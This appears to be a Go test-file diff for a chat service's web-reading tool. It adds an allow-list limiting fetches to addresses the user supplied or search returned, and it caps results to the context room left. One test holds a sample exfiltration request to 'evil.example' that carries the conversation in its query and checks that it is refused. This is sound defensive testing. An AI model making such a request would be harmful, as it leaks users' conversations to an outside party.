@@ -228,18 +228,18 @@ func TestResultsAreCutToTheRoomTheContextHasLeft(t *testing.T) {
 	r := newRig(t)
 	r.cfg.WebSearch = true
 	r.web.text = strings.Repeat("word ", 5000)
-	r.llama.toolRounds = [][]Call{{read("c1", "https://example.com/long")}}
+	r.llama.toolRounds = [][]Call{{search("c0", "long page")}, {read("c1", "https://go.dev/doc/go1.24")}}
 	if _, err := r.svc.Send("read it"); err != nil {
 		t.Fatal(err)
 	}
 	r.await(t)
-	if got := toolMessages(r.llama.last())[0].Content; len(got) > readChars+400 || !strings.Contains(got, "continues") {
+	if got := toolMessages(r.llama.last())[1].Content; len(got) > readChars+400 || !strings.Contains(got, "continues") {
 		t.Fatalf("a page of %d characters went to the model whole or without saying it was cut", len(got))
 	}
 }
 
 func TestBadCallsAreAnswersTheModelCanLearnFrom(t *testing.T) {
-	l := &lookup{web: &fakeWeb{}, chars: 100000, status: func(Status) {}, pages: map[string]bool{}, logf: func(string, ...any) {}}
+	l := &lookup{web: &fakeWeb{}, chars: 100000, status: func(Status) {}, pages: map[string]bool{}, allowed: map[string]bool{"https://example.com/a": true}, logf: func(string, ...any) {}}
 	ctx := context.Background()
 	for name, tc := range map[string]struct {
 		call Call
@@ -267,5 +267,55 @@ func TestTurningWebSearchOnIsSavedAndShownInTheInfo(t *testing.T) {
 	}
 	if err := r.svc.SetWebSearch(false); err != nil || r.svc.Info().WebSearch {
 		t.Fatalf("off: %v %+v", err, r.svc.Info())
+	}
+}
+
+func TestAPageNobodyOfferedIsNotFetched(t *testing.T) {
+	web := &fakeWeb{}
+	l := &lookup{web: web, chars: 100000, status: func(Status) {}, pages: map[string]bool{}, allowed: addressesIn([]Message{
+		{Role: "user", Text: "summarise https://example.com/mine, please."}, {Role: "assistant", Text: "see https://example.com/answer"},
+	}), logf: func(string, ...any) {}}
+	ctx := context.Background()
+	if got := l.run(ctx, read("1", "https://evil.example/?d=the+conversation")); !strings.Contains(got, "not one of the search results") || len(web.pages) != 0 {
+		t.Fatalf("an address the model made up was fetched: %q, %v", got, web.pages)
+	}
+	l.run(ctx, read("2", "https://example.com/answer"))
+	if len(web.pages) != 0 {
+		t.Error("an address only the assistant wrote was fetched")
+	}
+	l.run(ctx, read("3", "https://example.com/mine"))
+	l.run(ctx, search("4", "go"))
+	l.run(ctx, read("5", "https://go.dev/blog/go1.24"))
+	if len(web.pages) != 2 {
+		t.Fatalf("pages fetched: %v; the person's address and a search result should be", web.pages)
+	}
+}
+
+func TestSourcesNeverListAPageTwice(t *testing.T) {
+	l := &lookup{web: &fakeWeb{}, chars: 100000, status: func(Status) {}, pages: map[string]bool{}, allowed: map[string]bool{}, logf: func(string, ...any) {}}
+	ctx := context.Background()
+	l.run(ctx, search("1", "go release"))
+	l.run(ctx, search("2", "go 1.24 release"))
+	if got := l.sources(); len(got) != 2 {
+		t.Fatalf("sources = %+v", got)
+	}
+}
+
+// The room left is what a result may take, and it never goes below nothing.
+func TestAResultNeverTakesMoreThanTheRoomLeft(t *testing.T) {
+	for _, room := range []int{0, 300, 1600, 3000} {
+		l := &lookup{web: &fakeWeb{text: strings.Repeat("word ", 4000)}, chars: room, status: func(Status) {}, pages: map[string]bool{},
+			allowed: map[string]bool{"https://go.dev/doc/go1.24": true}, logf: func(string, ...any) {}}
+		got := l.run(context.Background(), read("1", "https://go.dev/doc/go1.24"))
+		if len(got) > max(room, 80)+60 { // the notice that something was cut, or the refusal when there is no room
+			t.Errorf("room %d: a result of %d characters", room, len(got))
+		}
+		if l.chars < -300 {
+			t.Errorf("room %d: %d left", room, l.chars)
+		}
+	}
+	l := &lookup{web: &fakeWeb{}, chars: 1000, status: func(Status) {}, pages: map[string]bool{}, allowed: map[string]bool{"https://a.example/": true}, logf: func(string, ...any) {}}
+	if got := l.run(context.Background(), read("1", "https://a.example/")); !strings.Contains(got, "no room") {
+		t.Errorf("with 1000 characters left a page should be refused for lack of room: %q", got)
 	}
 }
